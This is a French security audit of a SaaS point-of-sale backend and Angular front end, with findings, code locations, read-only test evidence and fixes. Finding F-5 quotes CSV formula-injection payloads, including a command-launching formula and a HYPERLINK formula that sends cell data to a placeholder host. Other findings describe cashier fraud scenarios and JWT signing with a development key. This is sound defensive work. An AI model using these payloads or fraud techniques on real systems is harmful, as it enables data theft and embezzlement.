# Audit sécurité 10/13 : module POINT DE VENTE (LJ SAAS, branche saas)

Date : 2026-11-11. Périmètre : `backend/src/main/java/tg/parcauto/api/pointdevente/**` (168 fichiers, environ 22 000 lignes) et écrans Angular `frontend/src/app/pages/pdv/**`, `shared/ticket-pdv.ts`, `shared/bon-cuisine.ts`, `core/services/retraits-hors-ligne.service.ts`.

Méthode : revue statique complète des contrôleurs (449 annotations de mapping et d'autorisation), des services d'argent (vente, caisse, trésorerie, dépenses, fournisseurs, crédit client, soldes) et de stock, puis tests dynamiques **en lecture seule** sur `http://localhost:8085`.

Pour ne pas écrire dans le journal d'audit (la connexion `/api/auth/login` y écrit), les jetons de test ont été signés en local avec la clé de développement déjà signalée dans l'audit du socle. Ces jetons durent 10 minutes et portent sur des comptes de test existants. Aucune donnée n'a été créée, modifiée ni supprimée. Aucun fichier du dépôt n'a été modifié.

Rappels hors périmètre (déjà signalés, non répétés) : clé JWT de développement, login sans limite, jeton en localStorage, BigDecimal géant + setScale, canaux STOMP ouverts à tous, verrou PIN purement navigateur, QR restaurant qui ignore la suspension, `/api/documents` qui ouvre les pièces PDV.

---

## Synthèse

| Gravité | Nombre |
|---|---|
| Critique | 0 |
| Élevée | 1 |
| Moyenne | 2 |
| Faible | 8 |
| Info | 2 |

### Les 3 priorités

1. **E-1** : encadrer les remises, les moyens de paiement sans référence et les sorties d'espèces directes du caissier (fraude interne invisible au comptage).
2. **M-1** : faire passer les règlements fournisseurs et les remboursements de solde payés depuis la caisse par le circuit de validation des dépenses.
3. **M-2** : réserver la lecture du catalogue (prix d'achat, stock) aux profils PDV et masquer `prixAchat` hors gestion.

### État des surfaces

| Surface | État |
|---|---|
| Authentification | Rien de propre au PDV. Tous les points `/api/pdv/**` exigent un jeton, sauf `/api/public/qr/**` (voulu). |
| Autorisation et cloisonnement | Cloisonnement entre entreprises solide : `@TenantId` sur toutes les entités PDV, aucune requête native hormis le résolveur QR paramétré, essais croisés en 404. Le périmètre par caisse marche pour les ventes, les sessions, les reçus, les livraisons et les soldes (confirmé en 409). Il ne s'applique pas aux commandes de salle ni aux bons d'impression (F-1). Le catalogue n'a aucun contrôle de rôle (M-2). |
| Argent et caisses | Prix, totaux et remises bornés recalculés côté serveur. Le prix envoyé par le front n'est jamais lu. `@Version` (sur `EntiteAuditee`) bloque les doubles validations, les doubles annulations et les mises à jour perdues sur le stock. Annulation après clôture refusée. Les faiblesses sont des contrôles anti-fraude internes (E-1, M-1, F-3) et une clôture sans verrou (F-4). |
| Stock | Contrôle de stock négatif côté service, `CHECK` en base sur les lieux et les réservations, verrou optimiste sur l'article. Pas de `CHECK stock_actuel >= 0` sur `pdv_article` (défense en profondeur, voir F-4). |
| Points publics (QR table) | Jeton de 128 bits (UUID v4), format vérifié, requête paramétrée, prix pris du catalogue, quantités et lignes bornées, limiteur par table, validation serveur par défaut. Faiblesses : jetons statiques visibles par tout le personnel (F-2), écritures pendant la lecture seule (F-6). |
| Injection | Pas de SQL dynamique. Tickets, additions et bons de cuisine échappés (`echapper`). Logo en base64 à type contrôlé. Pas de `[innerHTML]` dans les pages PDV. Contournement de la neutralisation des formules CSV (F-5). |
| Infra et fichiers | Pièces servies par `FichierServi` (type d'après l'extension, nosniff), à part le justificatif de dépense (I-1). Bombe de pixels possible à l'import de photos (F-7, réservé au gérant). Aucun appel sortant : l'IP de l'imprimante n'est pas contactée par le serveur, donc pas de SSRF. |

---

## ÉLEVÉE

### E-1 — Le caissier peut minorer une vente sans trace d'approbation : remise libre jusqu'à 100 %, moyen de paiement « AUTRE », « CARTE » ou « MOBILE_MONEY » sans référence, sorties d'espèces directes par défaut

- **Statut** : confirmé par le code. Pas de test dynamique, car il aurait fallu encaisser.
- **CVSS indicatif** : 6,5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N), classé Élevé pour l'impact financier direct.
- **Catégorie** : OWASP A04 (conception non sécurisée), ASVS V11.1 (logique métier).

**Emplacements**
- `backend/src/main/java/tg/parcauto/api/pointdevente/vente/VenteDto.java:23` (remise par ligne `@PositiveOrZero`), `:46` (remise globale), `:47-49` (mode de paiement libre, référence facultative).
- `backend/src/main/java/tg/parcauto/api/pointdevente/vente/VenteService.java:198-202` (remise de ligne bornée au seul montant de la ligne), `:342-345` (remise globale bornée au total), `:510-524` (hors espèces : `montantRecu = aPayer`, aucune référence exigée).
- `backend/src/main/java/tg/parcauto/api/pointdevente/restauration/RestaurationDto.java:125` (remise sur l'addition, même règle).
- `backend/src/main/java/tg/parcauto/api/pointdevente/caisse/CaisseService.java:171-197` (`mouvement` : un caissier affecté fait une SORTIE directe tant que la validation est désactivée).
- `backend/src/main/java/tg/parcauto/api/pointdevente/reglage/ReglagePdv.java:41` (`validationDepensesCaisse` est faux par défaut).
- Front : `frontend/src/app/pages/pdv/caisse/caisse.ts:96,209,766` (la remise est saisie librement et envoyée telle quelle).

**Description.** Le serveur recalcule bien les prix du catalogue. En revanche, toute personne au profil `CAISSIER` peut :
1. appliquer une remise de ligne ou une remise globale allant jusqu'au total, sans plafond, sans motif et sans visa du gérant ;
2. déclarer `AUTRE`, `CARTE` ou `MOBILE_MONEY` sans référence ; ces moyens n'entrent pas dans les espèces attendues (`CaisseService.especesAttendues`) ;
3. faire sortir des espèces du tiroir avec un simple motif tant que la validation des dépenses n'est pas activée, ce qui est le réglage par défaut.

**Scénarios d'exploitation**
- Un client paie 20 000 F en espèces. Le caissier encaisse le ticket avec une remise globale de 15 000 F et garde 15 000 F. Au comptage à l'aveugle, l'écart est nul, puisque les espèces attendues valent 5 000 F.
- Variante : le ticket est saisi en `AUTRE` sans référence. Les espèces attendues n'augmentent pas et le caissier garde le tout. Rien ne rapproche les ventes « mobile money » ou « autre » d'une transaction réelle.
- Variante : une sortie « achat de glace 10 000 F » validée par personne.

**Preuve (extrait)**
```java
// VenteService.java:342-345
BigDecimal remise = montant(reglement.remise());
if (remise.compareTo(totalBrut) > 0) { throw ... }   // seule borne
// VenteService.java:521-523
} else {
    vente.setMontantRecu(aPayer);                    // aucune reference exigee
    vente.setMonnaieRendue(BigDecimal.ZERO);
```

**Correctif recommandé**
- Dans `ReglagePdv`, ajouter `remiseMaxCaissierPourcent` (par exemple 0 ou 10 %) et `motifRemiseObligatoire`. Dans `VenteService.enregistrer` et `ligne`, pour un utilisateur non gestionnaire (`!PersonnelService.gestionnaire`), refuser une remise au-delà du plafond, ou exiger un visa : PIN du gérant vérifié côté serveur avec `PinService`, et `remiseAccordeePar` enregistré sur la vente.
- Rendre `referencePaiement` obligatoire (`@NotBlank` conditionnel côté service) pour `MOBILE_MONEY` et `CARTE`, réserver `AUTRE` aux gestionnaires, et afficher dans le rapport de session les ventes non-espèces avec leur référence pour le rapprochement.
- Activer `validationDepensesCaisse` par défaut pour les nouvelles entreprises, ou plafonner les sorties directes du caissier (par exemple au-dessus de X F, passage en `SortieAttente`).
- Dans le rapport de session (`RapportSessionPdf`), ajouter le total des remises par caissier et les ventes à remise supérieure à N %.

---

## MOYENNE

### M-1 — Les règlements fournisseurs et les remboursements de solde payés en espèces depuis la caisse contournent la validation des dépenses de caisse

- **Statut** : confirmé par le code.
- **CVSS** : 5,4 (PR:H, I:H).
- **Catégorie** : OWASP A01 (contrôle d'accès, contournement de workflow), ASVS V11.1.5.

**Emplacements**
- `backend/src/main/java/tg/parcauto/api/pointdevente/fournisseur/FournisseurService.java:316-321` : `caisseService.sortie(...)` direct, sans appel à `circuit.etapeInitiale`.
- `backend/src/main/java/tg/parcauto/api/pointdevente/materiaux/LivraisonClientService.java:248-262` : remboursement en espèces d'un solde, compté comme une sortie du tiroir, sans circuit.
- Comparer avec `backend/src/main/java/tg/parcauto/api/pointdevente/depense/DepensePdvService.java:308-327`, où le circuit s'applique.

**Description.** Quand l'administrateur active « validation des dépenses de caisse », une dépense saisie par un gérant passe en `ATTENTE_ADMIN` et rien ne sort du tiroir avant l'approbation. Deux autres chemins font pourtant sortir des espèces immédiatement, sur la seule décision du gérant :
- `POST /api/pdv/fournisseurs/{id}/reglements` avec `mode=CAISSE` ;
- `POST /api/pdv/ventes/{id}/soldes`, quand un surplus est remboursé en `ESPECES`.

**Scénario.** Le gérant (profil `GERANT`, `PDV_GESTION`) crée un fournisseur (`POST /api/pdv/fournisseurs`), une commande fournisseur et sa réception (`/api/pdv/approvisionnement/commandes`), ce qui crée une dette. Il règle ensuite cette dette `mode=CAISSE` : les espèces quittent le tiroir sans visa de l'administrateur, alors que le réglage l'exige pour toute dépense de caisse.

**Correctif.** Dans `FournisseurService.regler` et `LivraisonClientService.solder` (remboursement `ESPECES`), appeler `circuit.etapeInitiale(auteur)`. Si l'étape n'est pas `DIRECTE`, créer une `SortieAttente`, ou un statut `ATTENTE_*` sur `ReglementFournisseur`, approuvée ensuite par `SortieAttenteService.valider`. À défaut, refuser `mode=CAISSE` quand la validation est active et orienter vers la banque ou le coffre. Si l'exclusion est voulue métier, le documenter dans le réglage (« hors règlements fournisseurs »).

### M-2 — Catalogue lisible par tout compte authentifié de l'entreprise, prix d'achat et stock compris

- **Statut** : **confirmé dynamiquement**.
- **CVSS** : 4,3 (C:L).
- **Catégorie** : OWASP A01 (contrôle d'accès manquant), ASVS V4.1.3 (moindre privilège).

**Emplacement.** `backend/src/main/java/tg/parcauto/api/pointdevente/catalogue/CatalogueController.java:39-90`. Aucun `@PreAuthorize` sur `GET /api/pdv/categories`, `/api/pdv/articles`, `/api/pdv/articles/caisse`, `/api/pdv/articles/code/{code}` et `/api/pdv/articles/{id}`, ni au niveau de la classe. La réponse `CatalogueDto.ArticleReponse` (`catalogue/CatalogueDto.java:55-75`) contient `prixAchat`, `stockActuel` et `stockReserve`.

**Description.** Seul `@ModuleRequis(POINT_DE_VENTE)` s'applique. Tout rôle de l'entreprise peut donc lire le coût d'achat de chaque produit, donc la marge, et l'état du stock : préparateur, serveur, magasinier, associé, et même `CHAUFFEUR` ou `GESTIONNAIRE_PARC` si l'entreprise a aussi le parc. C'est l'information commerciale la plus sensible d'un commerce.

**Preuve.** Jeton local du préparateur `koffi@resto.tg` (rôle `PREPARATEUR`, entreprise 3) :
```
GET /api/pdv/articles?size=2   -> HTTP 200
{"content":[{"id":133,...,"prixVente":13000.00,"stockActuel":1.000,...},
            {"id":23,"nom":"AWOOYO","prixVente":1500.00,"prixAchat":600.00,"stockActuel":29.000,...}]}
```
Même constat pour le serveur `afi@resto.tg` sur `GET /api/pdv/articles/caisse` (`prixAchat` présent).

**Correctif**
- Mettre `@PreAuthorize(Autorisations.PDV_PERSONNEL)` sur les lectures, ou `PDV_SALLE` / `PDV_CAISSE` selon l'écran.
- Fournir à la caisse et à la salle un DTO sans `prixAchat` (par exemple `ArticleCaisse`). Réserver `prixAchat` à `PDV_GESTION` (fiche article, rapports).
- Vérifier aussi que le rôle `ASSOCIE` n'a besoin que de ses propres produits, déjà servis par `/api/pdv/associes/benefices`.

---

## FAIBLE

### F-1 — Le périmètre « chaque caisse ne voit que ses opérations » ne s'applique ni aux commandes de salle ni à la file d'impression

- **Statut** : confirmé dynamiquement en partie.
- **Catégorie** : OWASP A01 (IDOR intra-entreprise).

**Emplacements**
- `backend/src/main/java/tg/parcauto/api/pointdevente/restauration/CommandeController.java:60-66, 193-200` : `acces(id)` ne limite que le serveur (`PersonnelService.serveurSeul`). Le caissier lit et encaisse toute commande, quelle que soit sa session.
- `backend/src/main/java/tg/parcauto/api/pointdevente/impression/ImpressionController.java:63-97` : `a-imprimer?caisseId=` (n'importe quelle caisse), `/prise` (marque imprimés les bons d'une autre caisse), `/bons/{id}/duplicata`, `/ventes/{id}` et `/commandes/{id}`. Aucun de ces points n'appelle `PerimetreCaisse`.

Cela contredit la documentation de `caisse/PerimetreCaisse.java:13-16` (« ses propres opérations (ventes, commandes...) »).

**Preuve.** Jeton local de `yao@resto.tg` (CAISSIER, caisse 7) :
- `GET /api/pdv/ventes/35` (caisse 5) donne 409 « enregistrée sur une autre caisse » : le périmètre marche ici ;
- `GET /api/pdv/restauration/commandes/38` (session 6, caisse 5) donne **200**, avec les lignes, les prix et le reste à payer ;
- `GET /api/pdv/impression/ventes/35` donne 200 (liste vide ici, mais sans contrôle).

**Scénario.** Un caissier prend (`POST /api/pdv/impression/prise`) les bons de cuisine de la caisse terrasse. Ils passent « imprimés » à son nom et la cuisine ne les reçoit jamais, ce qui perturbe le service. Il peut aussi encaisser la table d'une autre caisse : l'argent entre dans son propre tiroir.

**Correctif.** Pour les profils `CAISSIER` et `SERVEUR`, appliquer `perimetre.exiger(...)` sur la session de la commande (`commande.getSessionId()`) dans `detail` et `encaisser`, sauf pour les commandes sans session (QR, en ligne). Dans `ImpressionService.aImprimer` et `prendre`, restreindre `caisseId` aux caisses de `perimetre.caisses(u)`. Contrôler `reimprimer`, `deLaVente` et `deLaCommande` de la même manière.

### F-2 — Jetons QR de table statiques, exposés à tout le personnel et sans rotation

- **Statut** : confirmé.
- **Catégorie** : OWASP A07 / A04.

**Emplacements**
- `backend/src/main/java/tg/parcauto/api/pointdevente/restauration/RestaurationDto.java:55-59` : `jetonQr` renvoyé dans le plan.
- `restauration/SalleController.java:36` : `GET /plan`, `PDV_SALLE` (serveurs et caissiers compris).
- `restauration/TableRestaurant.java:68-71` : jeton fixé à la création, renouvelé seulement à la main (`POST /tables/{id}/jeton`).
- `restauration/qr/CarteEnLigneService.java:105-118, 201-215` : limiteur en mémoire, par table, de 6 envois par 5 minutes.

**Preuve.** `GET /api/pdv/restauration/plan` avec le jeton d'un caissier renvoie `"jetonQr":"9bf2…7148"` (masqué) pour chaque table.

**Scénario.** Un ancien serveur, ou un client qui a photographié le QR, garde l'adresse et peut, sans être sur place, passer des commandes et des appels « addition » à toute heure d'ouverture. Si l'établissement désactive la validation serveur (`qrValidation=false`), chaque envoi part directement en cuisine et sort du stock : jusqu'à 6 × 30 lignes × 20 unités toutes les 5 minutes et par table, sur toutes les tables.

**Correctif**
- Retirer `jetonQr` du DTO du plan. L'exposer seulement à `PDV_GESTION`, via l'endpoint QR existant.
- Proposer une rotation : régénération planifiée ou à chaque fermeture de la commande de la table, ou jeton signé à durée limitée (HMAC avec table et période) imprimé sur un QR dynamique.
- Ajouter un limiteur global par établissement et par adresse IP (`LimiteurRequetes`).
- Signaler dans les réglages le risque de `qrValidation=false`.

### F-3 — Pas de séparation des tâches dans le circuit des espèces : un gérant peut envoyer puis valider sa propre remise

- **Statut** : confirmé par le code.
- **Catégorie** : ASVS V11.1 (logique métier).

**Emplacement.** `backend/src/main/java/tg/parcauto/api/pointdevente/tresorerie/TresorerieService.java:152-178` (un gestionnaire peut envoyer une remise sur toute session, via `sessionAutorisee`) et `:197-221` (`validerRemise` ne vérifie pas que `valideur.getId() != r.getCaissierId()`). Le recompte `valide` n'a pas de plafond (`CaisseService.java:236-251`).

**Scénario.** Le gérant tient lui-même une caisse, déclare une remise et la valide avec un recompte de son choix. Le seul contrôle qui reste est le dégagement final vers l'administrateur, qui peut être différé.

**Correctif.** Refuser `validerRemise` quand `valideur.getId().equals(r.getCaissierId())`, sauf pour l'administrateur. Si l'écart avec l'attendu dépasse la tolérance, exiger la validation de l'administrateur.

### F-4 — Clôture de session sans verrou : des opérations concurrentes peuvent arriver sur une session en cours de fermeture

- **Statut** : confirmé par le code. Non testé, car le test aurait exigé des écritures concurrentes.
- **Catégorie** : CWE-362 (condition de course).

**Emplacements**
- `backend/src/main/java/tg/parcauto/api/pointdevente/caisse/CaisseService.java:319-350` (`fermer`) et `:283-300` (`controlerMouvement`) ;
- `caisse/SessionTravailService.java:62-77` ;
- `vente/VenteService.java:387` (annulation : contrôle `session.ouverte()` sans verrou).

**Description.** `@Version` protège bien les entités modifiées : vente, article, remise, dépense, sortie. Une double validation ou une double annulation échoue donc par `OptimisticLockException`, ce qui est vérifié. En revanche, l'encaissement, les mouvements et l'annulation **lisent** la session sans la modifier. Une vente validée pendant `fermer`, entre le calcul de `attendu` et le commit, s'ajoute à une session FERMÉE : le rapport et l'écart figés deviennent faux. Deux sorties concurrentes passent aussi chacune le contrôle « disponible ». Enfin, `pdv_article.stock_actuel` n'a pas de `CHECK (stock_actuel >= 0)` en base (`V14__module_point_de_vente.sql:35`), contrairement à `pdv_stock_lieu`.

**Correctif**
- Dans `fermer`, `controlerMouvement` et `SessionTravailService.exiger`, charger la session avec `@Lock(PESSIMISTIC_WRITE)` (`SessionCaisseRepository.verrouiller(id)`), ou `LockModeType.OPTIMISTIC_FORCE_INCREMENT` dans les opérations qui s'y rattachent.
- Ajouter `ALTER TABLE pdv_article ADD CONSTRAINT ck_pdv_article_stock CHECK (stock_actuel >= 0)` en défense en profondeur.

### F-5 — Neutralisation des formules CSV contournable par un préfixe numérique négatif

- **Statut** : confirmé par le code.
- **Catégorie** : OWASP A03 (CSV / formula injection, CWE-1236).

**Emplacement.** `backend/src/main/java/tg/parcauto/api/pointdevente/rapport/ExportRapport.java:207-208`.
```java
String sure = valeur.matches("^[=+\\-@].*") && !valeur.matches("^-?\\d.*") ? "'" + valeur : valeur;
```
Toute valeur qui commence par `-` suivi d'un chiffre est laissée telle quelle, par exemple `-1+1+cmd|' /C calc'!A0`, alors que le tableur l'évalue comme une formule. Les tabulations et retours chariot en tête (`\t=`, `\r=`) ne sont pas traités non plus.

**Scénario.** Un caissier crée une fiche client au comptoir (`POST /api/pdv/clients`, `PDV_CAISSE`) nommée `-1+1+HYPERLINK("http://x/?"&A1)` ou similaire. Quand le gérant exporte en CSV un rapport qui contient le nom du client et l'ouvre dans Excel, la formule s'exécute ou exfiltre des cellules.

**Correctif.** Ne laisser passer que les nombres purs (`^-?\d+([.,]\d+)?$`) et préfixer `'` pour toute valeur texte commençant par `= + - @ \t \r`. Les cellules numériques sont de toute façon produites à partir de `BigDecimal`, pas de texte saisi.

### F-6 — Les commandes QR publiques restent acceptées pendant la lecture seule (abonnement expiré)

- **Statut** : confirmé par le code.
- **Lien** : constat « QR restaurant ignore la suspension » de l'audit plateforme ; ce constat-ci en est la variante « lecture seule ».

**Emplacement.** `backend/src/main/java/tg/parcauto/api/config/WebMvcConfig.java:36-38` (`excludePathPatterns("/api/public/**")` pour `LectureSeuleInterceptor`).

**Description.** Une session de caisse déjà ouverte au moment de l'expiration permet de continuer à créer des commandes, des lignes et des appels, avec sortie de stock si `qrValidation=false`, via `/api/public/qr/{jeton}/commande` et `/appel`.

**Correctif.** Dans `CarteEnLigneService.commander` et `appeler`, vérifier `abonnements.lectureSeule(ContexteEntreprise.exiger())`. Autre option : retirer `/api/public/qr/**` de l'exclusion, puisque `ContexteTableInterceptor` (ordre 0) pose l'entreprise avant `LectureSeuleInterceptor` (ordre 2).

### F-7 — Import de photos : pas de limite de pixels avant `ImageIO.read` et jusqu'à 250 Mo gardés en mémoire

- **Statut** : confirmé par le code ; réservé à `PDV_GESTION`.
- **Catégorie** : CWE-409 (bombe de décompression).

**Emplacements.** `backend/src/main/java/tg/parcauto/api/pointdevente/rapport/PhotoProduit.java:55` et `rapport/ArchiveImport.java:27-30, 98-110`.

**Description.** Un PNG de quelques Ko qui déclare 50 000 × 50 000 pixels fait allouer environ 10 Go de raster par `ImageIO.read`. La limite de 20 Mo par fichier ne porte que sur les octets compressés. Le résultat est une erreur `OutOfMemoryError` sur l'API partagée par toutes les entreprises.

**Correctif.** Lire d'abord les dimensions avec `ImageReader` (`reader.getWidth(0)` et `getHeight(0)` via `ImageIO.getImageReaders`), puis refuser au-delà de, par exemple, 8 000 × 8 000 ou 40 Mpx. Traiter les photos en flux au lieu de garder 250 Mo de `byte[]`.

### F-8 — Synchronisation hors ligne : date de remise fournie par l'appareil et non bornée ; devis à validité libre fixée par le caissier

- **Statut** : confirmé par le code.

**Emplacements**
- `backend/src/main/java/tg/parcauto/api/pointdevente/lieu/RetraitService.java:80-82, 223` : `livraison.setDateBon(r.faiteLe())` sans borne (futur ou passé lointain).
- `backend/src/main/java/tg/parcauto/api/pointdevente/materiaux/DevisService.java:194-199` : `valableJusqu` choisi par un `CAISSIER` sans limite haute. Les prix promis sont reconduits à la modification (`:84-89`).

**Note.** L'idempotence est correcte : la clé est unique par entreprise (`uk_pdv_remise_hors_ligne`, `V37:104`), et un rejeu renvoie « Déjà enregistrée ». Les quantités sont revérifiées côté serveur.

**Scénario**
- Un magasinier antidate un bon de livraison pour masquer un retard ou une sortie hors horaires.
- Un caissier crée un devis valable jusqu'en 2099 pour figer un prix avant une hausse du catalogue.

**Correctif**
- Borner `faiteLe` à l'intervalle [date de copie hors ligne − 72 h ; maintenant + 5 min] et garder la date de réception serveur à côté.
- Plafonner `valableJusqu` à `dateDevis + devisValiditeJours` pour les non-gestionnaires ; la prolongation est déjà réservée au gérant.

---

## INFO

### I-1 — Le justificatif de dépense n'utilise pas `FichierServi`

`backend/src/main/java/tg/parcauto/api/pointdevente/depense/DepensePdvController.java:106-116, 199-216` sert le fichier en `inline` avec un type déduit de l'extension, ou `application/octet-stream`. Le risque est faible, car le `nosniff` global de Spring Security reste actif et l'accès est réservé à `PDV_GESTION`. Pour la cohérence, remplacer par `FichierServi.reponse(fichier, nom, true)`, qui ajoute `attachment` pour les types non affichables et nettoie aussi `\r\n\\` dans le nom.

### I-2 — Points vérifiés et jugés solides

- **Prix** : à l'encaissement, le serveur relit les prix du catalogue (`VenteService.ligne`), le prix d'un conditionnement ou le prix garanti d'un devis, jamais le front. Pour une commande en ligne, le prix vient de la commande et le listener vérifie que le total correspond (`CommandeEnLigneService.venteEncaissee`).
- **Montants** : les quantités sont `@Positive` et les remises `@PositiveOrZero` et bornées. L'acompte doit être strictement inférieur au total. Un versement client ne peut pas dépasser ce qui est dû.
- **Cloisonnement** : `@TenantId` sur toutes les entités PDV, aucune requête native hormis `ContexteTableInterceptor` (paramétrée, format `^[a-f0-9]{32}$`). Une session d'une autre entreprise donne 404, et une liste par `sessionId` étranger revient vide.
- **Périmètre caisse** : ventes, sessions, reçus de règlement, livraisons et soldes donnent 409 sur une autre caisse (testé).
- **Concurrence** : `@Version` hérité de `EntiteAuditee` sur toutes les tables `pdv_*`. Index uniques sur la session ouverte par caisse (`uk_pdv_session_caisse_ouverte`) et sur la commande ouverte par table. File d'impression en `PESSIMISTIC_WRITE`.
- **Annulations** : refus après la fermeture de session, pour les ventes, les règlements, les soldes et les dépenses de caisse.
- **Affichage** : tickets, additions, reçus et bons de cuisine échappés (`shared/ticket-pdv.ts:7-13`, `shared/bon-cuisine.ts:4-10`). Logo en base64 à type contrôlé. Aucun `[innerHTML]` ni `bypassSecurityTrust*` dans `pages/pdv`.
- **Carte publique** : pas de `prixAchat` dans `CarteEnLigneDto`.
- **Associés** : un associé ne voit que sa propre part (`AssocieService.benefices`).
- **Appels sortants** : aucun ; l'adresse IP de l'imprimante est seulement stockée.

---

## Annexe : tests dynamiques effectués (lecture seule, port 8085)

Les jetons ont été signés localement (`scratchpad/tests/jwt.js`) avec la clé de développement de `application.yml`, pour 10 minutes, sur des comptes de test existants.

| Requête | Compte | Résultat |
|---|---|---|
| `GET /api/pdv/sessions/ouvertes` | kofi (CAISSIER, ent. 2) | 200, sa seule session |
| `GET /api/pdv/articles?size=2` | koffi (PREPARATEUR, ent. 3) | **200 avec `prixAchat`** (M-2) |
| `GET /api/pdv/articles/caisse` | afi (SERVEUR, ent. 3) | **200 avec `prixAchat`** (M-2) |
| `GET /api/pdv/ventes/35` | yao (CAISSIER caisse 7) | 409, autre caisse (OK) |
| `GET /api/pdv/ventes/30` | yao (ent. 3) | 404, autre entreprise (OK) |
| `GET /api/pdv/sessions/6`, `/ventes?sessionId=6` | yao | 409 (OK) |
| `GET /api/pdv/restauration/commandes/38` | yao | **200**, commande d'une autre caisse (F-1) |
| `GET /api/pdv/impression/ventes/35` | yao | 200 sans contrôle (F-1) |
| `GET /api/pdv/restauration/plan` | yao | **200 avec `jetonQr` de chaque table** (F-2) |
| `GET /api/public/qr/000…000` | anonyme | 404 (OK) |
| `POST /api/public/qr/{jeton}/commande` avec corps `{}` | anonyme | 400, validation (OK, rien écrit) |
